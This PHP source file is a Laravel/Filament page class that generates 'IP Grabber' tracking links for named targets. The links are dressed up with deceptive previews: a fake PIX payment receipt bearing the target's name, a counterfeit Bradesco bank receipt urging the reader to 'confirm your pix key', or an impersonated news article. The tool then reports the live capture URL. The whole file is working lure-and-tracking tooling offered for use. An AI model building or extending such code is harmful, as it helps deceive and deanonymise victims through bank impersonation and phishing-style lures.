<?php

namespace App\Filament\Resources\PixelTracks\Pages;

use App\Filament\Resources\PixelTracks\IpGrabberResource;
use App\Models\IpGrabber;
use App\Services\Pixel\NewsPreviewMetadataService;
use App\Services\Pixel\PixImagemService;
use Filament\Notifications\Notification;
use Filament\Resources\Pages\CreateRecord;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class CreateIpGrabber extends CreateRecord
{
    protected static string $resource = IpGrabberResource::class;

    protected static ?string $title = 'Gerar IP Grabber';

    protected function mutateFormDataBeforeCreate(array $data): array
    {
        $data['token'] = Str::random(40);
        $data['created_by'] = auth()->id();
        $data['tracking_channel'] = 'link';

        if (($data['preview_tipo'] ?? null) !== 'mensagem') {
            $data['tracking_domain'] = null;
            $data['redirect_url'] = null;
        }

        if (($data['preview_tipo'] ?? null) === 'mensagem' && ($data['mensagem'] ?? null) !== 'Redirecionar para página') {
            $data['redirect_url'] = null;
        }

        $usaUpload = (bool) ($data['preview_usar_upload'] ?? false);
        $usaUrl = (bool) ($data['preview_usar_url'] ?? false);
        unset(
            $data['preview_usar_upload'],
            $data['preview_usar_url'],
        );

        // Gera imagem PIX com nome do alvo + data/hora se o campo foi preenchido
        $nomeAlvo = trim((string) ($data['nome_alvo'] ?? ''));
        unset($data['nome_alvo']); // campo virtual — não persiste no banco

        if (($data['preview_tipo'] ?? null) === 'mensagem') {
            if (! $usaUpload) {
                $data['og_imagem_upload'] = null;
            }

            if (! $usaUrl) {
                $data['og_imagem'] = null;
            }
        }

        if (($data['preview_tipo'] ?? null) === 'pix_nome_alvo' && $nomeAlvo !== '') {
            $pathGerado = app(PixImagemService::class)->gerar($nomeAlvo, $data['token']);
            if ($pathGerado) {
                $data['og_titulo'] = 'Comprovante PIX';
                $data['og_descricao'] = 'Abra o comprovante para confirmar sua chave pix';
                $data['og_imagem_upload'] = $pathGerado;
                $data['og_imagem'] = null;
                $data['mensagem'] = IpGrabber::DEFAULT_CLICK_MESSAGE;
            }
        }

        if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
            $data['og_titulo'] = 'Comprovante PIX Bradesco';
            $data['og_descricao'] = 'Confirme sua chave pix clicando aqui.';
            $data['mensagem'] = IpGrabber::DEFAULT_CLICK_MESSAGE;
            $this->fillPixTemplateImage($data);
        }

        if (($data['preview_tipo'] ?? null) === 'noticia' && filled($data['noticia_url'] ?? null)) {
            $metadata = app(NewsPreviewMetadataService::class)->fetch((string) $data['noticia_url']);
            $data['og_titulo'] = filled($data['og_titulo'] ?? null) ? $data['og_titulo'] : ($metadata['og_titulo'] ?? null);
            $data['og_descricao'] = filled($data['og_descricao'] ?? null) ? $data['og_descricao'] : ($metadata['og_descricao'] ?? null);
            $data['og_imagem'] = filled($data['og_imagem'] ?? null) ? $data['og_imagem'] : ($metadata['og_imagem'] ?? null);

            if (empty($data['og_imagem_upload']) && filled($metadata['og_imagem'] ?? null)) {
                $data['og_imagem_upload'] = app(NewsPreviewMetadataService::class)
                    ->storeImage((string) $metadata['og_imagem'], (string) $data['token']);
            }

            $data['mensagem'] = 'Redirecionando para a notícia...';
        }

        return $data;
    }

    protected function afterCreate(): void
    {
        /** @var IpGrabber $ipGrabber */
        $ipGrabber = $this->record;
        $url = $ipGrabber->trackingUrl();
        $previewUrl = $ipGrabber->trackingUrlWithQuery(['preview' => 1]);

        Notification::make()
            ->title('IP Grabber criado com sucesso!')
            ->body("URL real: {$url}\nURL de teste sem captura: {$previewUrl}")
            ->success()
            ->persistent()
            ->send();
    }

    protected function getRedirectUrl(): string
    {
        return $this->getResource()::getUrl('index');
    }

    protected function getCreatedNotification(): ?Notification
    {
        return null;
    }

    private function fillPixTemplateImage(array &$data): void
    {
        foreach (['png', 'jpg', 'jpeg'] as $extension) {
            $template = "pixel-og/templates/pix-bradesco.{$extension}";

            if (! Storage::disk('public')->exists($template)) {
                continue;
            }

            $dest = 'pixel-og/' . $data['token'] . "-bradesco.{$extension}";
            Storage::disk('public')->copy($template, $dest);
            $data['og_imagem_upload'] = $dest;

            return;
        }
    }
}
